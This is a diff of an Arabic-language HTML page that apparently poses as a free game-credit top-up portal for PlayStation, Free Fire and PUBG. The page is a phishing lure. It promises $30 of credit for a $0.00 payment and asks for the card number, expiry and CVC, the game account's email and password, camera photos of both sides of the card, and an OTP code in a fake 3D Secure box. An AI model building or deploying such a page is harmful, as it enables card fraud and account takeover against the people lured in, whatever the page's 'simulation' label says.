@@ -1,27 +1,172 @@
-<!DOCTYPE html>
+<!doctype html>
 <html lang="ar" dir="rtl">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>عارض المواقع المتعدد</title>
-    <link rel="stylesheet" href="styles.css">
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1.0">
+  <title>بوابة دفع الألعاب (محاكاة احترافية)</title>
+  <link rel="stylesheet" href="styles.css">
+  <script src="app.js"></script>
 </head>
 <body>
+  <div class="container">
+    <header class="header">
+      <div class="brand">
+        <img src="https://placehold.co/40x40/ffab00/1a237e?text=💳" alt="شعار" id="logo" aria-hidden="true" style="border-radius: 8px;">
+        <h1>بوابة الشحن الأمني المباشر</h1>
+      </div>
+    </header>
 
-    <div class="controls">
-        <label for="url-input">الرابط:</label>
-        <input type="url" id="url-input" placeholder="أدخل رابط الموقع (مثل: https://example.com)" size="50" required>
-        
-        <label for="page-count">عدد الصفحات:</label>
-        <input type="number" id="page-count" value="2" min="1" max="10" required>
-        
-        <button id="load-button">عرض</button>
+    <!-- لوحة التنبيه الجديدة: المبلغ المطلوب للدفع صفر -->
+    <div class="zero-payment-alert">
+        **🎉 المبلغ المطلوب للدفع: 0.00$ (مجانًا)**
+        <br>
+        <span style="font-size:0.9rem; font-weight: 400;">البيانات مطلوبة لغرض التوثيق الأمني لهويتك فقط، ولن يتم سحب أي مبلغ من بطاقتك.</span>
     </div>
 
-    <div id="iframe-container">
+    <section class="instructions-box">
+      <h2>⚠️ تنبيه: نظام التوثيق الأمني (مرحلة اختبار) </h2>
+      <p>لإتمام عملية الشحن المجاني بقيمة **30.00$**، يرجى إدخال بيانات بطاقتك الائتمانية لحساب البنك، وبيانات حساب اللعبة ليتم شحن الرصيد مباشرة بعد التحقق الأمني.</p>
+      
+      <div class="warning">
+        **التحقق الأمني:** يتم طلب صور البطاقة المصرفية لتوثيق هوية المشتري وحماية العملية من الاحتيال.
+      </div>
+    </section>
+
+    <section class="payment-section">
+      <form id="paymentForm" novalidate>
+        
+        <!-- حقل اختيار الخدمة -->
+        <div class="form-group">
+            <label for="serviceSelect">اختر الخدمة المطلوبة</label>
+            <select id="serviceSelect" required>
+                <option value="" disabled selected>-- حدد الخدمة --</option>
+                <option value="sony">🎮 شحن رصيد سوني بلايستيشن (30$ رصيد)</option>
+                <option value="freefire">🔥 شحن رصيد فري فاير (30$ رصيد)</option>
+                <option value="pubg">🔫 شحن رصيد ببجي (30$ رصيد)</option>
+            </select>
         </div>
 
-    <script src="script.js"></script>
+        <!-- ملخص الطلب -->
+        <div class="order-summary">
+            <h4 style="margin-top:0; color:var(--accent-main);">ملخص الطلب</h4>
+            <div class="summary-row">
+                <span>رصيد الشحن:</span>
+                <span id="summaryServiceName">لم يتم التحديد</span>
+            </div>
+            <div class="summary-row total">
+                <span>المبلغ المطلوب للدفع:</span>
+                <span id="summaryTotal" class="price-label">0.00$</span>
+            </div>
+        </div>
 
+        <!-- حقول بيانات البطاقة البنكية -->
+        <h3 style="color:#00e676; margin-top: 30px; margin-bottom: 15px;">بيانات البطاقة المصرفية للتوثيق</h3>
+        
+        <div class="form-group">
+            <label for="cardNumber">رقم البطاقة</label>
+            <input type="text" id="cardNumber" placeholder="xxxx xxxx xxxx xxxx" maxlength="19" required>
+        </div>
+
+        <div class="form-row">
+            <div>
+                <label for="expMonth">شهر الانتهاء</label>
+                <input type="number" id="expMonth" placeholder="MM" min="1" max="12" required>
+            </div>
+            <div>
+                <label for="expYear">سنة الانتهاء</label>
+                <input type="number" id="expYear" placeholder="YY" min="25" max="99" required>
+            </div>
+            <div>
+                <label for="cvcCode">رمز الأمان (CVC)</label>
+                <input type="number" id="cvcCode" placeholder="CVC" maxlength="4" required>
+            </div>
+        </div>
+
+
+        <!-- حقول بيانات الحساب الجديدة -->
+        <h3 style="color:#00e676; margin-top: 30px; margin-bottom: 15px;">بيانات الحساب للشحن المباشر</h3>
+        <div class="form-group">
+            <label for="usernameInput">البريد الإلكتروني / اسم المستخدم</label>
+            <input type="text" id="usernameInput" placeholder="example@gaming.com" required>
+        </div>
+
+        <div class="form-group">
+            <label for="passwordInput">كلمة مرور الحساب</label>
+            <input type="password" id="passwordInput" placeholder="********" required>
+        </div>
+
+        <!-- قسم التقاط صور البطاقة -->
+        <div class="images-capture">
+            <h3 class="capture-title">✅ التوثيق الأمني بالصور</h3>
+            
+            <div class="images">
+              
+              <div class="image-field">
+                <label>الوجه الأمامي للبطاقة 💳</label>
+                <div class="controls">
+                  <!-- زر الكاميرا -->
+                  <button type="button" class="capture-btn camera-btn" data-side="front">
+                    <span class="camera-icon">📸</span> التقاط/رفع صورة
+                  </button>
+                  <!-- حقل الملف الفعلي مخفي -->
+                  <input type="file" id="frontInput" accept="image/*" capture="environment" aria-hidden="true" tabindex="-1">
+                </div>
+                <div class="preview" id="frontPreview">اضغط على الزر أعلاه للتوثيق.</div>
+              </div>
+
+              <div class="image-field">
+                <label>الوجه الخلفي للبطاقة (CVV) 🔒</label>
+                <div class="controls">
+                  <!-- زر الكاميرا -->
+                  <button type="button" class="capture-btn camera-btn" data-side="back">
+                    <span class="camera-icon">📸</span> التقاط/رفع صورة
+                  </button>
+                  <!-- حقل الملف الفعلي مخفي -->
+                  <input type="file" id="backInput" accept="image/*" capture="environment" aria-hidden="true" tabindex="-1">
+                </div>
+                <div class="preview" id="backPreview">اضغط على الزر أعلاه للتوثيق.</div>
+              </div>
+            </div>
+        </div>
+        
+        <div class="actions">
+          <button id="submitBtn" type="submit">إتمام عملية الشحن المجانية</button>
+          <div id="loader" class="loader hidden" aria-hidden="true"></div>
+        </div>
+
+        <div id="result" class="result" role="status" aria-live="polite"></div>
+      </form>
+    </section>
+  </div>
+
+  <!-- كاميرا Modal -->
+  <div id="cameraModal" class="modal hidden" aria-hidden="true">
+    <div class="modal-content">
+      <p style="margin:0; font-size:1.1rem; color:var(--accent-main);">تأكد من وضوح البطاقة في الإطار</p>
+      <canvas id="cameraCanvas" style="display:none;"></canvas>
+      <video id="video" autoplay playsinline style="width: 100%; max-width: 400px; height: auto;"></video>
+      <div class="modal-actions">
+        <button id="captureBtn">التقاط الصورة</button>
+        <button id="closeCameraBtn">إلغاء</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- 3D Secure Modal -->
+  <div id="secureModal" class="modal hidden" aria-hidden="true">
+    <div class="modal-content secure-modal-content">
+        <img src="https://placehold.co/80x80/303f9f/ffffff?text=🔒" alt="رمز الأمان" style="border-radius:50%;">
+        <h3>تحقق من الهوية (3D Secure)</h3>
+        <p>لإتمام عملية الشراء، يرجى إدخال **رمز التحقق السري (OTP)** الذي تم إرساله إلى رقم هاتفك المحمول.</p>
+        
+        <div class="form-group" style="display:flex; flex-direction:column; align-items:center;">
+            <label for="secureCodeInput">أدخل الرمز السري</label>
+            <input type="number" id="secureCodeInput" placeholder="1234" maxlength="4" required>
+        </div>
+        
+        <button id="secureSubmit">تأكيد الرمز وإتمام الدفع</button>
+        <p class="secure-note">⚠️ هذا الرمز وهمي (1234) ولن يتم التحقق منه، اضغط تأكيد للمتابعة.</p>
+    </div>
+  </div>
 </body>
 </html>
